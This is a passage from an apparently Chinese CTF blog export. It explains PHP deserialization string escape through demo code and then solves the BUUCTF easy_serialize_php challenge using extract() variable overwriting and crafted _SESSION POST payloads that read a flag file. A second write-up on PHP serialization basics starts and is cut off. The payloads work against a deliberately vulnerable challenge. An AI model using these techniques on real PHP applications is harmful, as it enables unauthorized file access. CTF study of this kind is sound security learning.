class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hack&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure><p>同样比较一下现有子串和目标子串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;//现有子串</span><br><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;//目标子串</span><br></pre></td></tr></table></figure><p>因为过滤的时候，将5个字符删减为了4个，所以和上面字符变多的情况相反，随着加入的admin的数量增多，现有子串后面会缩进来。</p><p>计算一下目标子串的长度：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;//目标子串</span><br><span class="line">//长度为47</span><br></pre></td></tr></table></figure><p>再计算一下到下一个可控变量的字符串长度：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;</span><br><span class="line">//长度为22</span><br></pre></td></tr></table></figure><p>因为每次过滤的时候都会少1个字符，因此我们先将admin字符重复22遍（这里的22遍不像字符变多的逃逸情况精确，后面可能会需要做调整）</p><p>完整代码如下：（这里的变量里一共有22个admin）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果：</p><p>注意：PHP反序列化的机制是，比如如果前面是规定了有10个字符，但是只读到了9个就到了双引号，这个时候PHP会把双引号当做第10个字符，也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:105:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure><p>这里我们需要仔细看一下s后面是105，也就是说我们需要读取到105个字符。从第一个引号开始，105个字符如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:6:</span><br><span class="line">image-20210820123924897</span><br></pre></td></tr></table></figure><p>也就是说123456这个地方成为了我们的可控变量，在123456可控变量的位置中添加我们的目标子串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;//目标子串</span><br></pre></td></tr></table></figure><p>完整代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:105:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure><p>仔细观察这一串字符串可以看到紫色方框内一共107个字符，但是前面只有显示105</p><p><img src="https://image.3001.net/images/20210824/1629789872_61249eb06d3f49c802d31.png!small"></p><p>造成这种现象的原因是：替换之前我们目标子串的位置是123456，一共6个字符，替换之后我们的目标子串显然超过10个字符，所以会造成计算得到的payload不准确</p><p>解决办法是：多添加2个admin，这样就可以补上缺少的字符。</p><p>修改后代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:115:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure><p>分析一下输出结果：<br><img src="https://image.3001.net/images/20210824/1629789872_61249eb0ac0a40a44c51a.png!small"></p><p>可以看到，这一下就对了。</p><p>我们将对象反序列化然后输出，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"><span class="variable">$a_seri_filter_unseri</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a_seri_filter</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a_seri_filter_unseri</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">object(user)#2 (3) &#123;</span><br><span class="line">[&quot;username&quot;]=&gt;</span><br><span class="line">string(115) &quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;</span><br><span class="line">[&quot;password&quot;]=&gt;</span><br><span class="line">string(6) &quot;123456&quot;</span><br><span class="line">[&quot;isVIP&quot;]=&gt;</span><br><span class="line">int(1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这个时候isVIP的值也为1，也就达到了我们反序列化字符逃逸的目的了</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);<span class="comment">//变量覆盖</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!//在这里看到flag文件名</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先使用phpingo看到flag位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://e319db73-5bb3-4c66-a24f-6feb1f0a099e.node4.buuoj.cn:81/index.php?f=phpinfo</span><br><span class="line">看到</span><br><span class="line">auto_append_filed0g3_f1ag.phpd0g3_f1ag.php</span><br></pre></td></tr></table></figure><p>返回源码，看到要用反序列化函数，必须f&#x3D;show_image看到filter以及反序列化，我们想到反序列化字符串逃逸，但是怎么改变_SESSION呢？答案就在下面这句话，导致变量覆盖<br>传送门【<a href="https://crayon-xin.github.io/2018/05/21/extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">extract变量覆盖</a>】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract($_POST);</span><br></pre></td></tr></table></figure><p>我们可以构造_SESSION数组了。本地搭建测试<br>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[a]=flagflagflagflagflagaaaa&amp;_SESSION[b]=aaaa&quot;;s:3:&quot;img&quot;;s:18:&quot;ZDBnM19mMWFnLnBocA&quot;;s:1:&quot;c&quot;;s:4:&quot;aaaa&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/27/BUUCTF-WEB-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8-extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/2022-03-27-15-37-23.png"><br>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;flag in /d0g3_fllllllag&#x27;;</span><br></pre></td></tr></table></figure><p>再次构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[a]=flagflagflagflagflagaaaa&amp;_SESSION[b]=aaaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;c&quot;;s:4:&quot;aaaa&quot;;&#125;</span><br></pre></td></tr></table></figure><p>获得flag</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>减少构造公式，用a吞b，用b替换c<br>a&#x3D;keykey..获得长度len(a)<br>b&#x3D;aaaa”;s:len(c):”c”;s:len(payload):”payload”;}记得满足属性数等条件<br>b中a的数量根据len(a)，要刚好吞掉至aaaa”;中的 ” 处 ，因为反序列化读取的时候，很机械，完全根据长度来读。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/vuls/281127.html">有意思的反序列化字符串逃逸</a><br><a href="https://www.freebuf.com/articles/web/285985.html">PHP反序列化字符逃逸详解</a><br><a href="https://www.freebuf.com/articles/web/285985.html">[安洵杯 2019]easy_serialize_php</a><br><a href="https://blog.csdn.net/solitudi/article/details/113588692">[CTF]PHP反序列化总结</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP反序列化 变量覆盖 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB-[D3CTF 2019]EzUpload 反序列化 .htaccess open_basdir绕过</title>
      <link href="/2022/03/26/BUUCTF-WEB-D3CTF-2019-EzUpload-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-htaccess-open-basdir%E7%BB%95%E8%BF%87/"/>
      <url>/2022/03/26/BUUCTF-WEB-D3CTF-2019-EzUpload-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-htaccess-open-basdir%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是PHP序列化？"><a href="#什么是PHP序列化？" class="headerlink" title="什么是PHP序列化？"></a>什么是PHP序列化？</h2><p>PHP序列化是一种把变量或对象以字符串形式转化以方便储存和传输的方法<br>举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class user</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="variable">$username</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">user</span>(<span class="string">&#x27;Bob&#x27;</span>);</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"><span class="comment">//输出 O:4:&quot;user&quot;:1:&#123;s:8:&quot;username&quot;;s:3:&quot;Bob&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">其中</span><br><span class="line">O代表object对象类型</span><br><span class="line">4是类名的长度</span><br><span class="line">&quot;user&quot;是类名</span><br><span class="line">1是对象内属性的个数</span><br><span class="line">s:8:&quot;username&quot;表示属性为字符串格式username为属性名 长度为8</span><br><span class="line">s:3:&quot;Bob&quot;是属性的值</span><br></pre></td></tr></table></figure><p>php中属性的共有类型共有三种:public protected private</p><p>被这三种修饰过的变量在序列化后有不同的格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public 正常序列化</span><br><span class="line">protected%00*%00变量名</span><br><span class="line">private%00变量名%00</span><br><span class="line"></span><br><span class="line">在复制payload时要注意手动输入%00</span><br></pre></td></tr></table></figure><h2 id="什么是反序列化？"><a href="#什么是反序列化？" class="headerlink" title="什么是反序列化？"></a>什么是反序列化？</h2><p>顾名思义，序列化的逆过程。</p><h2 id="什么是PHP反序列化魔法函数？"><a href="#什么是PHP反序列化魔法函数？" class="headerlink" title="什么是PHP反序列化魔法函数？"></a>什么是PHP反序列化魔法函数？</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()， <span class="title function_ invoke__">__destruct</span>()， <span class="title function_ invoke__">__call</span>()， <span class="title function_ invoke__">__callStatic</span>()， <span class="title function_ invoke__">__get</span>()， <span class="title function_ invoke__">__set</span>()， <span class="title function_ invoke__">__isset</span>()， <span class="title function_ invoke__">__unset</span>()， <span class="title function_ invoke__">__sleep</span>()， <span class="title function_ invoke__">__wakeup</span>()， <span class="title function_ invoke__">__serialize</span>(), <span class="title function_ invoke__">__unserialize</span>(), <span class="title function_ invoke__">__toString</span>()， <span class="title function_ invoke__">__invoke</span>()， <span class="title function_ invoke__">__set_state</span>()， <span class="title function_ invoke__">__clone</span>()和 <span class="title function_ 